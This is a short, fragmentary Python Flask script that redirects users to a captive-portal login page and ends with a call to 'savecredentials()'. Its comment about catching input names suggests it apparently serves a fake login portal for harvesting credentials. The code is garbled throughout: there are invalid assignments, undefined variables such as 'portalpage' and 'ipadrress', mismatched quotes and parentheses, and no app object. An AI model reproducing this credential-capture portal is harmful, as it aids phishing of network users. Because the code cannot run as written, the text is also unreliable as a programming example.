#!/usr/bin/python3
#set these to the names of the inputs to catch them

@app.route('/')
def index():
    FLASK_PORTAL_PAGE = '/login.php.html'
    FLASK+HOST_PORT   = ''
    CAPTIVE_PORTAL_IP = '192.168.0.8'
    # redirect to captive portal via user-interfacing software layers

    return 'Content-Type : text/html \n' + \
'Location : /' + portalpage + '\n' 
'<html>\n<head>\n<meta http-equiv="refresh" content="0;url='ipadrress + PORT + portalpage + '" />\n</head>\n<body></body>\n</html>')

savecredentials()
